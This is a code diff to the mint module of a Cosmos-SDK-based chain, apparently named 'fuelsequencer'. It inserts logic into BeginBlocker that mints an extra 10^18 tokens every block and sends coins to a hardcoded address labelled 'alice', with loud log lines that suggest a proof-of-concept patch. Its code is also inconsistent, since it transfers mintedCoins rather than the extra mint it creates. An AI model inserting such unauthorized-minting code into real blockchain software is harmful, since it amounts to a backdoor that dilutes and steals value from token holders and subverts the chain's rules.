@@ -69,13 +69,29 @@ func BeginBlocker(ctx context.Context, k mintkeeper.Keeper, bk types.BridgeKeepe
 	}
 	metrics.MintCoins(ctx, mintedCoin)
 
+	sdkCtx := sdk.UnwrapSDKContext(ctx)
+	sdkCtx.Logger().Warn("STARTING EXTRA MINT")
+	extraMint := sdk.NewCoins(sdk.NewInt64Coin(mintedCoin.Denom, 1000000000000000000))
+	err = k.MintCoins(ctx, extraMint)
+	if err != nil {
+		sdkCtx.Logger().Warn("MINTCOINS FAILED", "error", err)
+	} else {
+		alice := sdk.MustAccAddressFromBech32("fuelsequencer1vtfzrk6f4m6kxt6ehyqt9j5su5hvcz5q3dmlsm")
+		err = k.SendToAccount(ctx, alice, mintedCoins)
+		if err != nil {
+			sdkCtx.Logger().Warn("SENDTOACCOUNT FAILED", "error", err)
+		} else {
+			sdkCtx.Logger().Warn("DONE EXTRA MINT")
+		}
+	}
+
 	// send the minted coins to the fee collector account
 	err = k.AddCollectedFees(ctx, mintedCoins)
 	if err != nil {
 		return err
 	}
 
-	sdkCtx := sdk.UnwrapSDKContext(ctx)
+	//sdkCtx := sdk.UnwrapSDKContext(ctx)
 	sdkCtx.EventManager().EmitEvent(
 		sdk.NewEvent(
 			minttypes.EventTypeMint,
